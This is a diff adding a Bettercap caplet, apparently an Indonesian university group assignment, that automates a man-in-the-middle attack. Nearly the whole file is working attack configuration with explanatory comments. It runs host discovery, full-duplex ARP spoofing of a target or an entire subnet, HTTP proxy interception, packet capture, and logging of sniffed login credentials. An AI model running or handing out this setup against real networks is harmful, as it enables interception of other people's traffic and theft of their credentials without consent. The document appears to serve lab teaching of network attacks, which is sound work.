@@ -1,0 +1,61 @@
+# =============================================================================
+# Bettercap Caplet - ARP Spoofing + HTTP Credential Sniffing
+# =============================================================================
+# Tugas Kelompok 5 - Network Programming & Administration
+#
+# Caplet ini mengotomasi:
+# 1. ARP Spoofing (MITM positioning)
+# 2. HTTP proxy untuk intercept traffic
+# 3. Sniffing kredensial dari form login
+#
+# Penggunaan:
+#   sudo bettercap -iface <INTERFACE> -caplet mitm_attack.cap
+#
+# Contoh:
+#   sudo bettercap -iface tailscale0 -caplet mitm_attack.cap
+#
+# MITRE ATT&CK: T1557.002 (ARP Cache Poisoning) → T1040 (Network Sniffing)
+# ⚠️  FOR EDUCATIONAL PURPOSES ONLY
+# =============================================================================
+
+# ------- Konfigurasi Jaringan -------
+# Aktifkan network discovery untuk menemukan host di jaringan
+net.probe on
+
+# Tunggu 3 detik agar semua host terdeteksi
+sleep 3
+
+# Tampilkan semua host yang ditemukan
+net.show
+
+# ------- ARP Spoofing -------
+# Nyalakan ARP spoof - attacker akan menjadi MITM
+# Mode: full-duplex (spoofing kedua arah: victim ↔ gateway)
+set arp.spoof.fullduplex true
+
+# Target spesifik (kosongkan untuk seluruh subnet)
+# Ganti dengan IP Tailscale target vulnerable-app jika diperlukan
+# set arp.spoof.targets 100.x.x.x
+
+# Mulai ARP spoofing
+arp.spoof on
+
+# ------- HTTP Proxy (Sniffing) -------
+# Aktifkan HTTP proxy untuk intercept traffic plaintext
+set http.proxy.sslstrip false
+http.proxy on
+
+# ------- Network Sniffer -------
+# Aktifkan sniffer untuk menangkap paket
+set net.sniff.verbose true
+set net.sniff.output /tmp/bettercap-capture.pcap
+net.sniff on
+
+# ------- Event Logger -------
+# Log semua event ke file
+set events.stream.output /tmp/bettercap-events.log
+events.stream on
+
+# Tampilkan status
+# Bettercap akan otomatis menampilkan kredensial yang ditemukan
+# di log output dengan tag [http.proxy.auth]
